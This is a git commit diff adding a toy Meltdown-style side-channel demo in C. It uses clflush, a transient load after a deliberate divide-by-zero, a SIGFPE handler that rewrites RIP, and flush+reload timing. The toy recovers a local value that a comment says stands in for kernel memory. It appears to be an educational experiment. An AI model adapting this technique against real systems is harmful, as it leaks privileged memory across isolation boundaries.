361ca8fe8ff008f5fab33468527d98f19956e265
kimjy0126 <kimjy0126@skku.edu>
2019-08-23 15:04:05 +0900

    Add meltdown_toy.c

--- meltdown_toy.c
+++ meltdown_toy.c
@@ -1,49 +1,63 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
+#include <signal.h>
+#include <ucontext.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 
+extern char stop[];
+
+struct sigaction myact;
 unsigned long probe(char *adrs);    // flush+reload
 void cf(char *a);
-static inline void maccess(void *p);
+void my_handler(int sig, siginfo_t *siginfo, void *context)
+{
+    ucontext_t *ucontext = context;
+    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
+    return;
+}
+static inline void func(void *p)
+{
+    asm __volatile__
+        (
+         "  1:                  \n"
+         "  .rept 300           \n"
+         "  add $0x123, %%eax   \n"
+         "  .endr               \n"
+         "  mov $0x1, %%eax     \n"
+         "  mov $0x0, %%edx     \n"
+         "  divl %%edx          \n"
+         "  movq (%0), %%rcx    \n"
+         "  stop:               \n"
+         "  nop                 \n"
+         :
+         :  "r" (p)
+         :  "rax", "rdx", "rcx"
+        );
+}
 int main(void)
 {
     char arr[256 * 4096];
-    char data = 234; // just a random number
+    int data = 210; // just a random number
                     // this will be kernel memory value like *0xffffffff80000000 or something
     int status;
     unsigned long time[256];
     pid_t pid;
+    int zero = 0;
 
-//    memset(arr, 0xab, sizeof(arr));
+    myact.sa_sigaction = my_handler;
+    myact.sa_flags |= SA_SIGINFO;
+    sigaction(SIGFPE, &myact, NULL);
+    memset(arr, 0xab, sizeof(arr));
     for (int i = 0; i < 256; i++)
     {
         for (int j = 0; j < 256; j++)
         {
             cf(arr + j * 4096);
         }
-        pid = fork();
-        if (pid > 0)
-        {
-//            printf("parent process here! %ld %ld %ld\n", (long)getppid(), (long)getpid(), (long)pid);
-        }
-        else if (pid == 0)
-        {
-//            printf("child process here! %ld %ld %ld\n", (long)getppid(), (long)getpid(), (long)pid);
-            int kk = 1 / 0;
-//            char k = arr[data * 4096];
-            maccess(arr + data * 4096);
-        }
-        else if (pid == -1)
-        {
-            printf("ERR\n");
-        }
-        wait(&status);
-
-        /*
-           flush+reload here!
-        */
+        func(arr + data * 4096);
         time[i] = probe(&arr[i * 4096]);
     }
     for (int i = 0; i < 256; i++)
@@ -70,7 +84,7 @@ unsigned long probe(char *adrs)
          "  clflush 0(%1)       \n"
          :  "=a" (time)
          :  "c" (adrs)
-         :  "%esi", "%edx"
+         :  "esi", "edx"
         );
     return time;
 }
@@ -78,18 +92,8 @@ void cf(char *a)
 {
     asm __volatile__
         (
-         "  clflush 0(%0)      \n"
+         "  clflush 0(%0)       \n"
          :
          :  "c" (a)
-        );
-}
-static inline void maccess(void *p)
-{
-    asm __volatile__
-        (
-         "  movq (%0), %%rax    \n"
-         :
-         :  "c" (p)
-         : "rax"
         );
 }
